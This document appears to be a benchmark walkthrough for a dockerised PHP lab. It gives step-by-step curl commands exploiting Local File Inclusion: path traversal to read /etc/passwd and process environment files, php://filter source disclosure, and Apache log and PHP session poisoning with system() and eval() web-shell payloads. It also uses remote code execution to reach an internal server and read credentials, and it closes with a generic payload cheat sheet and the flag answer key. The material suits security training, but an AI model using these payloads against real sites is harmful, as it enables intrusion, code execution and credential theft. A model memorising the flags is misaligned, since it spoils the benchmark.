# S7BEN-VHARD-010: Local File Inclusion to RCE Testing Guide

## Overview

This guide provides step-by-step instructions for exploiting Local File Inclusion (LFI) vulnerabilities, including path traversal, log poisoning, and session poisoning to achieve Remote Code Execution (RCE).

## Prerequisites

- Docker and Docker Compose installed
- curl or similar HTTP client
- Basic understanding of PHP and web security
- Estimated time: 60-90 minutes

## Setup

```bash
cd benchmarks/S7BEN-VHARD-010
docker compose up -d
```

Wait for all services to become healthy:
```bash
docker compose ps
```

Expected output:
```
NAME              IMAGE            STATUS         PORTS
lfi-webapp        lfi-web-app      healthy        0.0.0.0:8080->80/tcp
lfi-fileserver    lfi-file-server  healthy        0.0.0.0:8081->80/tcp
lfi-logserver     lfi-log-server   healthy        (internal)
```

## Architecture

- **web-app** (port 8080): Main PHP application with LFI vulnerability
- **file-server** (port 8081): Internal file server with sensitive documents
- **log-server** (internal): Logging service for demonstrating log poisoning

---

## Phase 1: LFI Discovery and Path Traversal

### Objective
Identify the LFI vulnerability and use path traversal to read sensitive files.

### Step 1.1: Explore the Application

Open the web application:
```bash
curl http://localhost:8080/
```

Navigate through different pages:
```bash
curl "http://localhost:8080/?page=home"
curl "http://localhost:8080/?page=about"
curl "http://localhost:8080/?page=docs"
```

### Step 1.2: Test for LFI

Try loading a non-existent page:
```bash
curl "http://localhost:8080/?page=test"
```

### Step 1.3: Basic Path Traversal

Test path traversal to read /etc/passwd:
```bash
curl "http://localhost:8080/?page=../../../etc/passwd"
```

**Expected Result:**
You should see the contents of /etc/passwd, confirming the LFI vulnerability.

### Step 1.4: Read the First Flag

Read the flag file using path traversal:
```bash
curl -s "http://localhost:8080/?page=flag.txt"
```

Or with absolute path:
```bash
curl -s "http://localhost:8080/?page=/var/www/html/flag.txt"
```

**🚩 Flag 1 Retrieved:** `S7BEN{lfi_path_traversal_file_read_a1b2c3}`

### Step 1.5: Read PHP Source Code

Use php://filter wrapper to read PHP source code:
```bash
curl "http://localhost:8080/?page=php://filter/convert.base64-encode/resource=index.php"
```

Decode the base64 output:
```bash
curl -s "http://localhost:8080/?page=php://filter/convert.base64-encode/resource=index.php" | grep -oP '<pre>\K[^<]+' | base64 -d
```

This reveals the application source code, showing how the LFI vulnerability works.

---

## Phase 2: Sensitive File Disclosure

### Objective
Use LFI to read configuration files and discover internal services.

### Step 2.1: Read Apache Configuration

```bash
curl -s "http://localhost:8080/?page=/etc/apache2/apache2.conf" | head -50
```

### Step 2.2: Read PHP Configuration

```bash
curl -s "http://localhost:8080/?page=/usr/local/etc/php/php.ini-development" | head -30
```

### Step 2.3: Discover Session Files

First, get your session ID:
```bash
curl -c cookies.txt "http://localhost:8080/"
cat cookies.txt | grep PHPSESSID
```

Then read your session file:
```bash
# Replace SESSION_ID with your actual session ID
curl "http://localhost:8080/?page=/var/lib/php/sessions/sess_SESSION_ID"
```

### Step 2.4: Access /proc Files

Read process information:
```bash
# Read command line of current process
curl "http://localhost:8080/?page=/proc/self/cmdline"

# Read environment variables
curl "http://localhost:8080/?page=/proc/self/environ"
```

---

## Phase 3: Apache Log Poisoning

### Objective
Poison Apache access logs with PHP code and achieve RCE by including the log file.

### Step 3.1: Locate Apache Log File

The Apache access log is typically at `/var/log/apache2/access.log` (shared between containers via Docker volume).

Try to read it first:
```bash
curl -s "http://localhost:8080/?page=/var/log/apache2/access.log" | tail -20
```

### Step 3.2: Poison the User-Agent

Inject PHP code into the User-Agent header:
```bash
curl -A "<?php system('id'); ?>" "http://localhost:8080/"
```

### Step 3.3: Execute Code via Log Inclusion

Include the poisoned log file:
```bash
curl -s "http://localhost:8080/?page=/var/log/apache2/access.log" | grep "uid="
```

**Expected Result:**
You should see the output of the `id` command within the log output.

### Step 3.4: Advanced RCE - Execute Custom Commands

Poison the log with a more flexible payload:
```bash
curl -A "<?php system(\$_GET['cmd']); ?>" "http://localhost:8080/"
```

Now execute commands:
```bash
# List files
curl -s "http://localhost:8080/?page=/var/log/apache2/access.log&cmd=ls+-la+/var/www/html" | grep -A5 "index.php"

# Read flag
curl -s "http://localhost:8080/?page=/var/log/apache2/access.log&cmd=cat+/var/www/html/flag.txt" | grep "S7BEN{"
```

### Step 3.5: Extract Log Poisoning Flag

The log server contains a flag. First, find where the flag is:
```bash
curl -s "http://localhost:8080/?page=/var/log/apache2/access.log&cmd=find+/+-name+*flag*+2>/dev/null" | grep -o "/.*flag.*"
```

Read the log poisoning flag:
```bash
# Method 1: Via environment variable in log-server
curl -s "http://localhost:8080/?page=/var/log/apache2/access.log&cmd=cat+/var/www/html/index.php" | grep "FLAG_LOG"
```

**🚩 Flag 2 Retrieved:** `S7BEN{apache_log_poisoning_rce_d4e5f6}`

---

## Phase 4: PHP Session Poisoning

### Objective
Inject PHP code into session data and execute it by including the session file.

### Step 4.1: Set Session Data

First, access the contact page and inject PHP code via the name parameter:
```bash
curl -c session_cookies.txt "http://localhost:8080/?page=contact&name=<?php system('whoami'); ?>"
```

### Step 4.2: Get Your Session ID

```bash
cat session_cookies.txt | grep PHPSESSID | awk '{print $NF}'
```

### Step 4.3: Include Session File

Replace SESSION_ID with your actual session ID:
```bash
curl -b session_cookies.txt "http://localhost:8080/?page=/var/lib/php/sessions/sess_SESSION_ID"
```

**Expected Result:**
You should see the output of `whoami` command.

### Step 4.4: Advanced Session Poisoning

Inject a more powerful payload:
```bash
curl -c session2.txt "http://localhost:8080/?page=contact&name=<?php+eval(\$_GET[x]);+?>"
```

Get session ID:
```bash
SESSION_ID=$(cat session2.txt | grep PHPSESSID | awk '{print $NF}')
```

Execute commands:
```bash
# List files
curl -b session2.txt "http://localhost:8080/?page=/var/lib/php/sessions/sess_$SESSION_ID&x=system('ls+-la');"

# Read session flag
curl -b session2.txt "http://localhost:8080/?page=/var/lib/php/sessions/sess_$SESSION_ID&x=system('cat+/var/www/html/session_flag.txt');"
```

**🚩 Flag 3 Retrieved:** `S7BEN{php_session_poisoning_rce_g7h8i9}`

---

## Phase 5: Full RCE and Flag Extraction

### Objective
Demonstrate full compromise and extract all flags.

### Step 5.1: Extract All Flags Using Log Poisoning

Poison the log:
```bash
curl -A "<?php system(\$_GET['c']); ?>" "http://localhost:8080/"
```

Extract all flags:
```bash
# Flag 1 - LFI flag
curl -s "http://localhost:8080/?page=/var/log/apache2/access.log&c=cat+/var/www/html/flag.txt" | grep -o "S7BEN{[^}]*}"

# Flag 2 - Find log flag
curl -s "http://localhost:8080/?page=/var/log/apache2/access.log&c=find+/var/www+-name+*.php+-exec+grep+-l+FLAG_LOG+{}+\;" | grep "index.php"

# Flag 3 - Session flag
curl -s "http://localhost:8080/?page=/var/log/apache2/access.log&c=cat+/var/www/html/session_flag.txt" | grep -o "S7BEN{[^}]*}"
```

### Step 5.2: Access Internal File Server

The file server is accessible at http://file-server/ from within the container network.

Use RCE to access it:
```bash
curl -s "http://localhost:8080/?page=/var/log/apache2/access.log&c=curl+http://file-server/internal_flag.txt" | grep "S7BEN{"
```

**Bonus Flag:** `S7BEN{internal_file_server_access_j1k2l3}`

### Step 5.3: Read Credentials

```bash
curl -s "http://localhost:8080/?page=/var/log/apache2/access.log&c=curl+http://file-server/credentials.txt"
```

---

## Flag Summary

By completing all phases, you should have retrieved the following flags:

| Flag ID | Value | Technique | Location |
|---------|-------|-----------|----------|
| FLAG_LFI | `S7BEN{lfi_path_traversal_file_read_a1b2c3}` | Path traversal | /var/www/html/flag.txt |
| FLAG_LOG | `S7BEN{apache_log_poisoning_rce_d4e5f6}` | Log poisoning | Via RCE |
| FLAG_SESSION | `S7BEN{php_session_poisoning_rce_g7h8i9}` | Session poisoning | /var/www/html/session_flag.txt |
| BONUS | `S7BEN{internal_file_server_access_j1k2l3}` | Internal access via RCE | http://file-server/ |

---

## Verification

### Health Checks

```bash
curl http://localhost:8080/health.php
curl http://localhost:8081/
```

### Quick Flag Extraction

```bash
# Direct file reads
docker exec lfi-webapp cat /var/www/html/flag.txt
docker exec lfi-webapp cat /var/www/html/session_flag.txt
docker exec lfi-fileserver cat /usr/share/nginx/html/internal_flag.txt
```

---

## Cleanup

```bash
docker compose down
```

Remove volumes:
```bash
docker compose down -v
```

---

## Key Learning Points

1. **LFI Detection**: Test parameters that load files with path traversal sequences (`../../../`)

2. **PHP Wrappers**: Use `php://filter` to read source code, `php://input` for POST data execution

3. **Log Poisoning**: Inject PHP code via HTTP headers (User-Agent, Referer, etc.) and include log files

4. **Session Poisoning**: Control session data and include session files for code execution

5. **Defense**:
   - Use whitelists for file inclusion
   - Avoid dynamic file inclusion with user input
   - Disable dangerous PHP functions (exec, system, passthru)
   - Set open_basedir restriction
   - Monitor and restrict log file access

---

## Common Payloads Reference

### Path Traversal

```
# Linux
?page=../../../etc/passwd
?page=../../../../var/log/apache2/access.log
?page=/etc/passwd

# Windows
?page=../../../windows/system32/drivers/etc/hosts
?page=C:/Windows/System32/drivers/etc/hosts
```

### PHP Wrappers

```php
# Read file as base64
?page=php://filter/convert.base64-encode/resource=index.php

# Execute POST data
?page=php://input
# POST: <?php system('id'); ?>

# Data wrapper
?page=data://text/plain,<?php system('id'); ?>
?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==
```

### Log Poisoning

```bash
# Poison User-Agent
curl -A "<?php system(\$_GET['cmd']); ?>" http://target/

# Poison Referer
curl -H "Referer: <?php system(\$_GET['cmd']); ?>" http://target/

# Then include log
?page=/var/log/apache2/access.log&cmd=whoami
```

### Session Poisoning

```bash
# Inject into session
?page=contact&name=<?php system('id'); ?>

# Include session file
?page=/var/lib/php/sessions/sess_<SESSION_ID>
```

---

## Common Pitfalls

- **Escaping**: Ensure special characters in URLs are properly encoded
- **Session ID**: Use cookies to maintain the same session when doing session poisoning
- **Log Cleanup**: Logs can become very large; use `tail` or grep to filter relevant content
- **Permissions**: Some files may not be readable due to permissions
- **PHP Version**: Null byte bypass (`%00`) only works in PHP < 5.3.4

---

## References

- [OWASP: Testing for LFI](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion)
- [HackTricks: File Inclusion](https://book.hacktricks.xyz/pentesting-web/file-inclusion)
- [PayloadsAllTheThings: LFI](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion)

---

**Benchmark Complete!** You have successfully exploited LFI vulnerabilities and achieved RCE through multiple attack vectors.
